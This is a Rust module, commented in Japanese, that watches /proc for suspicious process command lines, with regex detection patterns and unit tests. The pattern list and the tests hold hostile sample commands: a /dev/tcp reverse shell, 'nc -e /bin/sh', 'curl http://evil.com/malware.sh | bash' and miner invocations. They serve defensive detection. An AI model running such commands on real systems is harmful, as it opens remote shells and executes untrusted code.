//! プロセス起動コマンドライン監視モジュール
//!
//! `/proc/[pid]/cmdline` を定期スキャンし、不審なコマンドライン引数を検知する。
//!
//! 検知対象:
//! - リバースシェル（bash, nc, python, perl, ruby, php, socat 等）
//! - 暗号通貨マイナー（xmrig, minerd, cpuminer, stratum 等）
//! - パイプ経由のリモートコード実行（curl|bash, wget|sh, base64 -d|sh 等）
//! - 権限昇格・侵入テストツール（linpeas, linEnum, pspy 等）
//! - ユーザー定義の追加パターン

use crate::config::ProcessCmdlineMonitorConfig;
use crate::core::event::{EventBus, SecurityEvent, Severity};
use crate::error::AppError;
use crate::modules::{InitialScanResult, Module};
use std::collections::{BTreeMap, HashMap};
use std::path::Path;
use tokio_util::sync::CancellationToken;

/// 検知カテゴリ
#[derive(Debug, Clone, Copy)]
enum DetectionCategory {
    /// リバースシェル
    ReverseShell,
    /// 暗号通貨マイナー
    CryptoMiner,
    /// パイプ経由のリモートコード実行
    RemoteCodeExec,
    /// 権限昇格・侵入テストツール
    PentestTool,
    /// ユーザー定義パターン
    CustomPattern,
}

impl DetectionCategory {
    fn event_type(self) -> &'static str {
        match self {
            Self::ReverseShell => "cmdline_reverse_shell",
            Self::CryptoMiner => "cmdline_crypto_miner",
            Self::RemoteCodeExec => "cmdline_remote_code_exec",
            Self::PentestTool => "cmdline_pentest_tool",
            Self::CustomPattern => "cmdline_custom_pattern",
        }
    }

    fn severity(self) -> Severity {
        match self {
            Self::ReverseShell | Self::CryptoMiner | Self::RemoteCodeExec => Severity::Critical,
            Self::PentestTool | Self::CustomPattern => Severity::Warning,
        }
    }

    fn label(self) -> &'static str {
        match self {
            Self::ReverseShell => "リバースシェル",
            Self::CryptoMiner => "暗号通貨マイナー",
            Self::RemoteCodeExec => "リモートコード実行",
            Self::PentestTool => "権限昇格/侵入テストツール",
            Self::CustomPattern => "カスタムパターン",
        }
    }
}

/// 検知結果
struct Finding {
    pid: u32,
    comm: String,
    cmdline: String,
    category: DetectionCategory,
    matched_pattern: String,
}

/// 組み込みパターン定義
struct PatternDef {
    category: DetectionCategory,
    pattern: &'static str,
}

/// 組み込みの検知パターン一覧
const BUILTIN_PATTERNS: &[PatternDef] = &[
    // リバースシェル
    PatternDef {
        category: DetectionCategory::ReverseShell,
        pattern: r"bash\s+-i\s+.*[>&]+\s*/dev/tcp/",
    },
    PatternDef {
        category: DetectionCategory::ReverseShell,
        pattern: r"\bnc\b.*\s-[ec]\s",
    },
    PatternDef {
        category: DetectionCategory::ReverseShell,
        pattern: r"\bncat\b.*\s-[ec]\s",
    },
    PatternDef {
        category: DetectionCategory::ReverseShell,
        pattern: r"\bnetcat\b.*\s-[ec]\s",
    },
    PatternDef {
        category: DetectionCategory::ReverseShell,
        pattern: r"python[23]?\s+-c\s+.*import\s+socket",
    },
    PatternDef {
        category: DetectionCategory::ReverseShell,
        pattern: r"perl\s+-e\s+.*use\s+socket",
    },
    PatternDef {
        category: DetectionCategory::ReverseShell,
        pattern: r"ruby\s+-rsocket",
    },
    PatternDef {
        category: DetectionCategory::ReverseShell,
        pattern: r"php\s+-r\s+.*fsockopen",
    },
    PatternDef {
        category: DetectionCategory::ReverseShell,
        pattern: r"\bsocat\b.*\bexec\b",
    },
    PatternDef {
        category: DetectionCategory::ReverseShell,
        pattern: r"exec\s+\d+<>/dev/tcp/",
    },
    PatternDef {
        category: DetectionCategory::ReverseShell,
        pattern: r"mkfifo\s+.*\bnc\b",
    },
    PatternDef {
        category: DetectionCategory::ReverseShell,
        pattern: r"/dev/udp/",
    },
    PatternDef {
        category: DetectionCategory::ReverseShell,
        pattern: r"openssl\s+s_client\s+-connect",
    },
    // 暗号通貨マイナー
    PatternDef {
        category: DetectionCategory::CryptoMiner,
        pattern: r"\bxmrig\b",
    },
    PatternDef {
        category: DetectionCategory::CryptoMiner,
        pattern: r"\bminerd\b",
    },
    PatternDef {
        category: DetectionCategory::CryptoMiner,
        pattern: r"\bcpuminer\b",
    },
    PatternDef {
        category: DetectionCategory::CryptoMiner,
        pattern: r"stratum\+tcp://",
    },
    PatternDef {
        category: DetectionCategory::CryptoMiner,
        pattern: r"stratum\+ssl://",
    },
    PatternDef {
        category: DetectionCategory::CryptoMiner,
        pattern: r"--donate-level",
    },
    PatternDef {
        category: DetectionCategory::CryptoMiner,
        pattern: r"\bcryptominer\b",
    },
    PatternDef {
        category: DetectionCategory::CryptoMiner,
        pattern: r"\bethminer\b",
    },
    // パイプ経由リモートコード実行
    PatternDef {
        category: DetectionCategory::RemoteCodeExec,
        pattern: r"curl\s+.*\|\s*(ba)?sh",
    },
    PatternDef {
        category: DetectionCategory::RemoteCodeExec,
        pattern: r"wget\s+.*\|\s*(ba)?sh",
    },
    PatternDef {
        category: DetectionCategory::RemoteCodeExec,
        pattern: r"curl\s+.*-o\s*-\s*.*\|\s*(ba)?sh",
    },
    PatternDef {
        category: DetectionCategory::RemoteCodeExec,
        pattern: r"base64\s+-d\s*\|\s*(ba)?sh",
    },
    // 権限昇格・侵入テストツール
    PatternDef {
        category: DetectionCategory::PentestTool,
        pattern: r"\blinpeas\b",
    },
    PatternDef {
        category: DetectionCategory::PentestTool,
        pattern: r"\blinenum\b",
    },
    PatternDef {
        category: DetectionCategory::PentestTool,
        pattern: r"\bpspy",
    },
    PatternDef {
        category: DetectionCategory::PentestTool,
        pattern: r"\bchisel\b.*\bclient\b",
    },
    PatternDef {
        category: DetectionCategory::PentestTool,
        pattern: r"\bmsfconsole\b",
    },
    PatternDef {
        category: DetectionCategory::PentestTool,
        pattern: r"\bmsfvenom\b",
    },
    PatternDef {
        category: DetectionCategory::PentestTool,
        pattern: r"\bmimikatz\b",
    },
];

/// コンパイル済みパターンセット
struct CompiledPatterns {
    /// (regex, category, pattern_str) のリスト
    patterns: Vec<(regex::Regex, DetectionCategory, String)>,
    /// 除外パターン
    exclude_patterns: Vec<regex::Regex>,
}

impl CompiledPatterns {
    fn compile(config: &ProcessCmdlineMonitorConfig) -> Result<Self, AppError> {
        let mut patterns = Vec::new();

        // 組み込みパターンをコンパイル
        for def in BUILTIN_PATTERNS {
            // unwrap safety: 組み込みパターンはテストで検証済み
            let re = regex::Regex::new(def.pattern).map_err(|e| AppError::ModuleConfig {
                message: format!("組み込みパターンのコンパイルに失敗: {}: {}", def.pattern, e),
            })?;
            patterns.push((re, def.category, def.pattern.to_string()));
        }

        // ユーザー定義追加パターン
        for pattern_str in &config.extra_patterns {
            let re = regex::Regex::new(pattern_str).map_err(|e| AppError::ModuleConfig {
                message: format!(
                    "extra_patterns に無効な正規表現が含まれています: {}: {}",
                    pattern_str, e
                ),
            })?;
            patterns.push((re, DetectionCategory::CustomPattern, pattern_str.clone()));
        }

        // 除外パターン
        let mut exclude_patterns = Vec::new();
        for pattern_str in &config.exclude_patterns {
            let re = regex::Regex::new(pattern_str).map_err(|e| AppError::ModuleConfig {
                message: format!(
                    "exclude_patterns に無効な正規表現が含まれています: {}: {}",
                    pattern_str, e
                ),
            })?;
            exclude_patterns.push(re);
        }

        Ok(Self {
            patterns,
            exclude_patterns,
        })
    }

    /// コマンドラインをパターンマッチする
    fn check(&self, cmdline: &str) -> Option<(DetectionCategory, String)> {
        let lower = cmdline.to_lowercase();

        // 除外パターンに一致したらスキップ
        for re in &self.exclude_patterns {
            if re.is_match(&lower) {
                return None;
            }
        }

        // 検知パターンに一致するか
        for (re, category, pattern_str) in &self.patterns {
            if re.is_match(&lower) {
                return Some((*category, pattern_str.clone()));
            }
        }

        None
    }
}

/// `/proc/[pid]/cmdline` を読み取り、スペース結合した文字列を返す
fn read_proc_cmdline(proc_path: &Path, pid: u32) -> Option<String> {
    let path = proc_path.join(format!("{}/cmdline", pid));
    let data = std::fs::read(path).ok()?;
    if data.is_empty() {
        return None; // カーネルスレッド
    }
    // ヌル文字区切りをスペースで結合
    let args: Vec<&str> = data
        .split(|&b| b == 0)
        .filter(|chunk| !chunk.is_empty())
        .map(|chunk| std::str::from_utf8(chunk).unwrap_or(""))
        .collect();
    if args.is_empty() {
        return None;
    }
    Some(args.join(" "))
}

/// `/proc/[pid]/comm` からプロセス名を取得する
fn read_process_comm(proc_path: &Path, pid: u32) -> String {
    let path = proc_path.join(format!("{}/comm", pid));
    std::fs::read_to_string(path)
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|_| "unknown".to_string())
}

/// `/proc/` から全 PID を列挙する
fn list_pids(proc_path: &Path) -> Vec<u32> {
    let entries = match std::fs::read_dir(proc_path) {
        Ok(e) => e,
        Err(_) => return Vec::new(),
    };
    entries
        .filter_map(|entry| {
            let entry = entry.ok()?;
            let name = entry.file_name();
            name.to_str()?.parse::<u32>().ok()
        })
        .collect()
}

/// 全プロセスのコマンドラインスナップショットを取得する
fn take_cmdline_snapshot(proc_path: &Path) -> HashMap<u32, String> {
    let pids = list_pids(proc_path);
    let self_pid = std::process::id();
    let mut snapshot = HashMap::new();

    for pid in pids {
        if pid == self_pid {
            continue;
        }
        if let Some(cmdline) = read_proc_cmdline(proc_path, pid) {
            snapshot.insert(pid, cmdline);
        }
    }
    snapshot
}

/// スナップショットをスキャンし、不審なコマンドラインを検知する
fn scan_snapshot(
    proc_path: &Path,
    snapshot: &HashMap<u32, String>,
    compiled: &CompiledPatterns,
) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (pid, cmdline) in snapshot {
        if let Some((category, matched_pattern)) = compiled.check(cmdline) {
            let comm = read_process_comm(proc_path, *pid);
            findings.push(Finding {
                pid: *pid,
                comm,
                cmdline: cmdline.clone(),
                category,
                matched_pattern,
            });
        }
    }

    findings
}

/// プロセス起動コマンドライン監視モジュール
///
/// `/proc/[pid]/cmdline` を定期スキャンし、リバースシェル・暗号通貨マイナー等の
/// 不審なコマンドライン引数を検知する。
pub struct ProcessCmdlineMonitorModule {
    config: ProcessCmdlineMonitorConfig,
    cancel_token: CancellationToken,
    event_bus: Option<EventBus>,
}

impl ProcessCmdlineMonitorModule {
    /// 新しいプロセス起動コマンドライン監視モジュールを作成する
    pub fn new(config: ProcessCmdlineMonitorConfig, event_bus: Option<EventBus>) -> Self {
        Self {
            config,
            cancel_token: CancellationToken::new(),
            event_bus,
        }
    }

    /// キャンセルトークンのクローンを返す
    pub fn cancel_token(&self) -> CancellationToken {
        self.cancel_token.clone()
    }

    /// 検出結果をイベントバスに発行する
    fn publish_findings(findings: &[Finding], event_bus: &Option<EventBus>, is_initial: bool) {
        let Some(bus) = event_bus else {
            return;
        };

        for f in findings {
            let prefix = if is_initial {
                "起動時スキャン: "
            } else {
                ""
            };
            let severity = if is_initial {
                Severity::Info
            } else {
                f.category.severity()
            };
            let message = format!(
                "{}不審なプロセスを検知: {} (PID:{}, カテゴリ: {})",
                prefix,
                f.comm,
                f.pid,
                f.category.label()
            );
            let details = format!(
                "PID={}, プロセス名={}, カテゴリ={}, マッチパターン={}, コマンドライン={}",
                f.pid,
                f.comm,
                f.category.label(),
                f.matched_pattern,
                truncate_cmdline(&f.cmdline, 200)
            );

            if is_initial {
                tracing::info!(
                    pid = f.pid,
                    comm = %f.comm,
                    event_type = f.category.event_type(),
                    "{}",
                    message
                );
            } else {
                tracing::warn!(
                    pid = f.pid,
                    comm = %f.comm,
                    event_type = f.category.event_type(),
                    "{}",
                    message
                );
            }

            bus.publish(
                SecurityEvent::new(
                    f.category.event_type(),
                    severity,
                    "process_cmdline_monitor",
                    &message,
                )
                .with_details(details),
            );
        }
    }
}

/// コマンドラインを指定文字数で切り詰める
fn truncate_cmdline(s: &str, max_len: usize) -> String {
    if s.len() <= max_len {
        s.to_string()
    } else {
        format!("{}...", &s[..max_len])
    }
}

impl Module for ProcessCmdlineMonitorModule {
    fn name(&self) -> &str {
        "process_cmdline_monitor"
    }

    fn init(&mut self) -> Result<(), AppError> {
        if self.config.scan_interval_secs == 0 {
            return Err(AppError::ModuleConfig {
                message: "scan_interval_secs は 0 より大きい値を指定してください".to_string(),
            });
        }

        // パターンの妥当性を検証
        for pattern in &self.config.extra_patterns {
            if regex::Regex::new(pattern).is_err() {
                return Err(AppError::ModuleConfig {
                    message: format!(
                        "extra_patterns に無効な正規表現が含まれています: {}",
                        pattern
                    ),
                });
            }
        }
        for pattern in &self.config.exclude_patterns {
            if regex::Regex::new(pattern).is_err() {
                return Err(AppError::ModuleConfig {
                    message: format!(
                        "exclude_patterns に無効な正規表現が含まれています: {}",
                        pattern
                    ),
                });
            }
        }

        tracing::info!(
            scan_interval_secs = self.config.scan_interval_secs,
            extra_patterns_count = self.config.extra_patterns.len(),
            exclude_patterns_count = self.config.exclude_patterns.len(),
            "プロセス起動コマンドライン監視モジュールを初期化しました"
        );

        Ok(())
    }

    async fn start(&mut self) -> Result<tokio::task::JoinHandle<()>, AppError> {
        let compiled = CompiledPatterns::compile(&self.config)?;

        // ベースラインスナップショット
        let baseline = take_cmdline_snapshot(Path::new("/proc"));
        tracing::info!(
            process_count = baseline.len(),
            "プロセスコマンドラインベースラインスキャンが完了しました"
        );

        // 初回スキャン結果の発行
        let initial_findings = scan_snapshot(Path::new("/proc"), &baseline, &compiled);
        Self::publish_findings(&initial_findings, &self.event_bus, false);

        let config = self.config.clone();
        let cancel_token = self.cancel_token.clone();
        let event_bus = self.event_bus.clone();

        let handle = tokio::spawn(async move {
            // ループ内でパターンを再コンパイル（config は clone 済み）
            let compiled = match CompiledPatterns::compile(&config) {
                Ok(c) => c,
                Err(e) => {
                    tracing::error!(error = %e, "パターンコンパイルに失敗しました");
                    return;
                }
            };

            let mut interval =
                tokio::time::interval(std::time::Duration::from_secs(config.scan_interval_secs));
            interval.tick().await;

            let mut prev_snapshot = baseline;

            loop {
                tokio::select! {
                    _ = cancel_token.cancelled() => {
                        tracing::info!("プロセス起動コマンドライン監視モジュールを停止します");
                        break;
                    }
                    _ = interval.tick() => {
                        let current = take_cmdline_snapshot(Path::new("/proc"));

                        // 差分検知: 前回になかった PID、または cmdline が変化した PID のみ
                        let mut new_entries = HashMap::new();
                        for (pid, cmdline) in &current {
                            match prev_snapshot.get(pid) {
                                Some(prev_cmdline) if prev_cmdline == cmdline => {
                                    // 変化なし — スキップ
                                }
                                _ => {
                                    // 新規 PID または cmdline 変化
                                    new_entries.insert(*pid, cmdline.clone());
                                }
                            }
                        }

                        if !new_entries.is_empty() {
                            let findings = scan_snapshot(
                                Path::new("/proc"),
                                &new_entries,
                                &compiled,
                            );
                            ProcessCmdlineMonitorModule::publish_findings(
                                &findings,
                                &event_bus,
                                false,
                            );

                            // 大量検知の異常アラート
                            if findings.len() > 20 {
                                tracing::warn!(
                                    count = findings.len(),
                                    "不審なコマンドラインの大量検知（攻撃の可能性）"
                                );
                                if let Some(bus) = &event_bus {
                                    bus.publish(
                                        SecurityEvent::new(
                                            "cmdline_mass_alert",
                                            Severity::Critical,
                                            "process_cmdline_monitor",
                                            "不審なコマンドラインの大量検知（攻撃の可能性）",
                                        )
                                        .with_details(format!("検知件数={}", findings.len())),
                                    );
                                }
                            }
                        }

                        prev_snapshot = current;
                    }
                }
            }
        });

        Ok(handle)
    }

    async fn initial_scan(&self) -> Result<InitialScanResult, AppError> {
        let start = std::time::Instant::now();
        let compiled = CompiledPatterns::compile(&self.config)?;

        let snapshot = take_cmdline_snapshot(Path::new("/proc"));
        let items_scanned = snapshot.len();

        let findings = scan_snapshot(Path::new("/proc"), &snapshot, &compiled);
        let issues_found = findings.len();

        Self::publish_findings(&findings, &self.event_bus, true);

        let mut scan_snapshot = BTreeMap::new();
        scan_snapshot.insert("process_count".to_string(), items_scanned.to_string());
        scan_snapshot.insert("issues_found".to_string(), issues_found.to_string());

        let duration = start.elapsed();

        Ok(InitialScanResult {
            items_scanned,
            issues_found,
            duration,
            summary: format!(
                "プロセス {}件のコマンドラインをスキャン、不審なプロセス {}件を検出",
                items_scanned, issues_found
            ),
            snapshot: scan_snapshot,
        })
    }

    async fn stop(&mut self) -> Result<(), AppError> {
        self.cancel_token.cancel();
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn default_config() -> ProcessCmdlineMonitorConfig {
        ProcessCmdlineMonitorConfig {
            enabled: true,
            scan_interval_secs: 30,
            extra_patterns: vec![],
            exclude_patterns: vec![],
        }
    }

    #[test]
    fn test_list_pids() {
        let pids = list_pids(Path::new("/proc"));
        if cfg!(target_os = "linux") {
            assert!(!pids.is_empty());
            assert!(pids.contains(&1));
        }
    }

    #[test]
    fn test_list_pids_nonexistent() {
        let pids = list_pids(Path::new("/nonexistent"));
        assert!(pids.is_empty());
    }

    #[test]
    fn test_read_proc_cmdline_self() {
        if cfg!(target_os = "linux") {
            let pid = std::process::id();
            let cmdline = read_proc_cmdline(Path::new("/proc"), pid);
            assert!(cmdline.is_some());
            let cmdline = cmdline.unwrap();
            assert!(!cmdline.is_empty());
        }
    }

    #[test]
    fn test_read_proc_cmdline_nonexistent() {
        let cmdline = read_proc_cmdline(Path::new("/proc"), 999_999_999);
        assert!(cmdline.is_none());
    }

    #[test]
    fn test_read_process_comm() {
        if cfg!(target_os = "linux") {
            let comm = read_process_comm(Path::new("/proc"), 1);
            assert!(!comm.is_empty());
            assert_ne!(comm, "unknown");
        }
    }

    #[test]
    fn test_read_process_comm_nonexistent() {
        let comm = read_process_comm(Path::new("/proc"), 999_999_999);
        assert_eq!(comm, "unknown");
    }

    #[test]
    fn test_truncate_cmdline_short() {
        assert_eq!(truncate_cmdline("hello", 10), "hello");
    }

    #[test]
    fn test_truncate_cmdline_long() {
        let long_str = "a".repeat(300);
        let result = truncate_cmdline(&long_str, 200);
        assert!(result.ends_with("..."));
        assert_eq!(result.len(), 203);
    }

    #[test]
    fn test_compiled_patterns_builtin() {
        let config = default_config();
        let compiled = CompiledPatterns::compile(&config).unwrap();
        assert_eq!(compiled.patterns.len(), BUILTIN_PATTERNS.len());
        assert!(compiled.exclude_patterns.is_empty());
    }

    #[test]
    fn test_compiled_patterns_with_extra() {
        let mut config = default_config();
        config.extra_patterns = vec!["suspicious-tool".to_string()];
        let compiled = CompiledPatterns::compile(&config).unwrap();
        assert_eq!(compiled.patterns.len(), BUILTIN_PATTERNS.len() + 1);
    }

    #[test]
    fn test_compiled_patterns_invalid_extra() {
        let mut config = default_config();
        config.extra_patterns = vec!["[invalid".to_string()];
        let result = CompiledPatterns::compile(&config);
        assert!(result.is_err());
    }

    #[test]
    fn test_compiled_patterns_invalid_exclude() {
        let mut config = default_config();
        config.exclude_patterns = vec!["[invalid".to_string()];
        let result = CompiledPatterns::compile(&config);
        assert!(result.is_err());
    }

    #[test]
    fn test_check_reverse_shell_bash() {
        let config = default_config();
        let compiled = CompiledPatterns::compile(&config).unwrap();
        let result = compiled.check("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1");
        assert!(result.is_some());
        let (cat, _) = result.unwrap();
        assert!(matches!(cat, DetectionCategory::ReverseShell));
    }

    #[test]
    fn test_check_reverse_shell_nc() {
        let config = default_config();
        let compiled = CompiledPatterns::compile(&config).unwrap();
        let result = compiled.check("nc -e /bin/sh 10.0.0.1 4242");
        assert!(result.is_some());
        let (cat, _) = result.unwrap();
        assert!(matches!(cat, DetectionCategory::ReverseShell));
    }

    #[test]
    fn test_check_reverse_shell_python() {
        let config = default_config();
        let compiled = CompiledPatterns::compile(&config).unwrap();
        let result = compiled.check("python3 -c 'import socket,subprocess,os'");
        assert!(result.is_some());
        let (cat, _) = result.unwrap();
        assert!(matches!(cat, DetectionCategory::ReverseShell));
    }

    #[test]
    fn test_check_reverse_shell_perl() {
        let config = default_config();
        let compiled = CompiledPatterns::compile(&config).unwrap();
        let result = compiled.check("perl -e 'use Socket;$i=\"10.0.0.1\";'");
        assert!(result.is_some());
        let (cat, _) = result.unwrap();
        assert!(matches!(cat, DetectionCategory::ReverseShell));
    }

    #[test]
    fn test_check_crypto_miner_xmrig() {
        let config = default_config();
        let compiled = CompiledPatterns::compile(&config).unwrap();
        let result = compiled.check("/tmp/xmrig --url stratum+tcp://pool.example.com:3333");
        assert!(result.is_some());
        let (cat, _) = result.unwrap();
        assert!(matches!(cat, DetectionCategory::CryptoMiner));
    }

    #[test]
    fn test_check_crypto_miner_stratum() {
        let config = default_config();
        let compiled = CompiledPatterns::compile(&config).unwrap();
        let result = compiled.check("./miner --url stratum+tcp://evil.pool:3333");
        assert!(result.is_some());
        let (cat, _) = result.unwrap();
        assert!(matches!(cat, DetectionCategory::CryptoMiner));
    }

    #[test]
    fn test_check_remote_code_exec_curl_bash() {
        let config = default_config();
        let compiled = CompiledPatterns::compile(&config).unwrap();
        let result = compiled.check("curl http://evil.com/malware.sh | bash");
        assert!(result.is_some());
        let (cat, _) = result.unwrap();
        assert!(matches!(cat, DetectionCategory::RemoteCodeExec));
    }

    #[test]
    fn test_check_remote_code_exec_base64() {
        let config = default_config();
        let compiled = CompiledPatterns::compile(&config).unwrap();
        let result = compiled.check("echo dGVzdA== | base64 -d | sh");
        assert!(result.is_some());
        let (cat, _) = result.unwrap();
        assert!(matches!(cat, DetectionCategory::RemoteCodeExec));
    }

    #[test]
    fn test_check_pentest_tool_linpeas() {
        let config = default_config();
        let compiled = CompiledPatterns::compile(&config).unwrap();
        let result = compiled.check("/tmp/linpeas.sh");
        assert!(result.is_some());
        let (cat, _) = result.unwrap();
        assert!(matches!(cat, DetectionCategory::PentestTool));
    }

    #[test]
    fn test_check_pentest_tool_pspy() {
        let config = default_config();
        let compiled = CompiledPatterns::compile(&config).unwrap();
        let result = compiled.check("/dev/shm/pspy64");
        assert!(result.is_some());
        let (cat, _) = result.unwrap();
        assert!(matches!(cat, DetectionCategory::PentestTool));
    }

    #[test]
    fn test_check_normal_process() {
        let config = default_config();
        let compiled = CompiledPatterns::compile(&config).unwrap();
        assert!(compiled.check("/usr/bin/ls -la /etc").is_none());
        assert!(compiled.check("/usr/sbin/sshd -D").is_none());
        assert!(compiled.check("vim /etc/hosts").is_none());
        assert!(compiled.check("/usr/lib/systemd/systemd --user").is_none());
    }

    #[test]
    fn test_check_exclude_pattern() {
        let mut config = default_config();
        config.exclude_patterns = vec!["legitimate-xmrig".to_string()];
        let compiled = CompiledPatterns::compile(&config).unwrap();
        // 除外パターンに一致すれば検知しない
        assert!(compiled.check("legitimate-xmrig --threads 4").is_none());
        // 除外パターンに一致しなければ検知する
        let result = compiled.check("/tmp/xmrig --pool evil.com");
        assert!(result.is_some());
    }

    #[test]
    fn test_check_custom_pattern() {
        let mut config = default_config();
        config.extra_patterns = vec!["my-suspicious-tool".to_string()];
        let compiled = CompiledPatterns::compile(&config).unwrap();
        let result = compiled.check("/tmp/my-suspicious-tool --evil");
        assert!(result.is_some());
        let (cat, _) = result.unwrap();
        assert!(matches!(cat, DetectionCategory::CustomPattern));
    }

    #[test]
    fn test_take_cmdline_snapshot() {
        let snapshot = take_cmdline_snapshot(Path::new("/proc"));
        if cfg!(target_os = "linux") {
            assert!(!snapshot.is_empty());
            // 自プロセスが含まれていないことを確認
            let self_pid = std::process::id();
            assert!(!snapshot.contains_key(&self_pid));
        }
    }

    #[test]
    fn test_take_cmdline_snapshot_nonexistent() {
        let snapshot = take_cmdline_snapshot(Path::new("/nonexistent"));
        assert!(snapshot.is_empty());
    }

    #[test]
    fn test_scan_snapshot_no_suspicious() {
        let config = default_config();
        let compiled = CompiledPatterns::compile(&config).unwrap();
        let mut snapshot = HashMap::new();
        snapshot.insert(1u32, "/usr/lib/systemd/systemd --switched-root".to_string());
        snapshot.insert(2u32, "/usr/sbin/sshd -D".to_string());
        let findings = scan_snapshot(Path::new("/proc"), &snapshot, &compiled);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_scan_snapshot_suspicious() {
        let config = default_config();
        let compiled = CompiledPatterns::compile(&config).unwrap();
        let mut snapshot = HashMap::new();
        snapshot.insert(100u32, "/tmp/xmrig --donate-level 1".to_string());
        snapshot.insert(101u32, "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1".to_string());
        let findings = scan_snapshot(Path::new("/proc"), &snapshot, &compiled);
        assert_eq!(findings.len(), 2);
    }

    #[test]
    fn test_init_zero_interval() {
        let mut config = default_config();
        config.scan_interval_secs = 0;
        let mut module = ProcessCmdlineMonitorModule::new(config, None);
        assert!(module.init().is_err());
    }

    #[test]
    fn test_init_invalid_extra_patterns() {
        let mut config = default_config();
        config.extra_patterns = vec!["[invalid".to_string()];
        let mut module = ProcessCmdlineMonitorModule::new(config, None);
        assert!(module.init().is_err());
    }

    #[test]
    fn test_init_invalid_exclude_patterns() {
        let mut config = default_config();
        config.exclude_patterns = vec!["[invalid".to_string()];
        let mut module = ProcessCmdlineMonitorModule::new(config, None);
        assert!(module.init().is_err());
    }

    #[test]
    fn test_init_valid() {
        let mut module = ProcessCmdlineMonitorModule::new(default_config(), None);
        assert!(module.init().is_ok());
    }

    #[tokio::test]
    async fn test_start_and_stop() {
        let mut config = default_config();
        config.scan_interval_secs = 3600;
        let mut module = ProcessCmdlineMonitorModule::new(config, None);
        module.init().unwrap();

        let cancel_token = module.cancel_token();
        module.start().await.unwrap();

        module.stop().await.unwrap();
        assert!(cancel_token.is_cancelled());
    }

    #[tokio::test]
    async fn test_initial_scan() {
        let module = ProcessCmdlineMonitorModule::new(default_config(), None);

        let result = module.initial_scan().await.unwrap();
        assert!(result.summary.contains("プロセス"));
        if cfg!(target_os = "linux") {
            assert!(result.items_scanned > 0);
        }
    }

    #[test]
    fn test_detection_category_event_type() {
        assert_eq!(
            DetectionCategory::ReverseShell.event_type(),
            "cmdline_reverse_shell"
        );
        assert_eq!(
            DetectionCategory::CryptoMiner.event_type(),
            "cmdline_crypto_miner"
        );
        assert_eq!(
            DetectionCategory::RemoteCodeExec.event_type(),
            "cmdline_remote_code_exec"
        );
        assert_eq!(
            DetectionCategory::PentestTool.event_type(),
            "cmdline_pentest_tool"
        );
        assert_eq!(
            DetectionCategory::CustomPattern.event_type(),
            "cmdline_custom_pattern"
        );
    }

    #[test]
    fn test_detection_category_severity() {
        assert_eq!(
            DetectionCategory::ReverseShell.severity(),
            Severity::Critical
        );
        assert_eq!(
            DetectionCategory::CryptoMiner.severity(),
            Severity::Critical
        );
        assert_eq!(
            DetectionCategory::RemoteCodeExec.severity(),
            Severity::Critical
        );
        assert_eq!(DetectionCategory::PentestTool.severity(), Severity::Warning);
        assert_eq!(
            DetectionCategory::CustomPattern.severity(),
            Severity::Warning
        );
    }

    #[test]
    fn test_all_builtin_patterns_compile() {
        // 全ての組み込みパターンが正常にコンパイルできることを検証
        for (i, def) in BUILTIN_PATTERNS.iter().enumerate() {
            assert!(
                regex::Regex::new(def.pattern).is_ok(),
                "パターン #{} がコンパイルに失敗: {}",
                i,
                def.pattern
            );
        }
    }
}
